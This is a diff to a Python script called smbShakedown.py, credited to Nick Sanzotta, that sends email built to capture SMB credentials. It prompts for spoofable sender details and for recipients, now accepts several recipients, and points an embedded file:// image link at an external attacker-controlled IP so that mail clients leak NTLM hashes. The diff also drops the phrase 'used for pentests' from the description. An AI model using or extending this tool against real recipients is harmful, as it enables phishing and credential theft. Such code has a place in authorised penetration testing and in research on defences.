@@ -1,5 +1,5 @@
 #/usr/bin/python
-# Description: A simplified SMB Email Client Attack script used for pentests.
+# Description: A simplified SMB Email Client Attack script.
 # Created by: Nick Sanzotta / @beamr
 # Version: smbShakedown.py v 1.0
 import os, smtplib, getpass, readline, socket, time
@@ -81,13 +81,14 @@ def main():
 	print("\n")
 	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+ipAddress+']: ') or  ipAddress
 	print('ENTERED:' "%s" % smbCaptureServer + "\n")
-	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
+	senderName = raw_input('Enter "from name":[Tester]') or  'Tester'
 	print('ENTERED:' "%s" % senderName + "\n")
 	senderAddress = raw_input('Enter "from address":['+smtpUser+']') or  smtpUser
 	print('ENTERED:' "%s" % senderAddress + "\n")
-	recipientName = raw_input('Enter recipient(s) name[Bob]: ')
+	recipientName = raw_input('Enter recipient(s) name[Client]: ') or 'client'
 	print('ENTERED:' "%s" % recipientName + "\n")
-	recipientAddress = raw_input('Enter recipient(s) address[bob@company.com]: ')
+	rawrcptAddress = raw_input('Enter recipient(s) address[client@company.com]: ')
+	recipientAddress=rawrcptAddress.split(',')
 	print('ENTERED:' "%s" % recipientAddress + "\n")
 
 
@@ -105,7 +106,7 @@ Subject: smbShakedown.py test.
 <img src=file://{4}/image/foo.gif>
 """
 ##########################################################
-	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, smbCaptureServer)
+	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, extipAddress)
 	print('Email Message Template Below:')
 	time.sleep(1)
 	print(emailMessage)
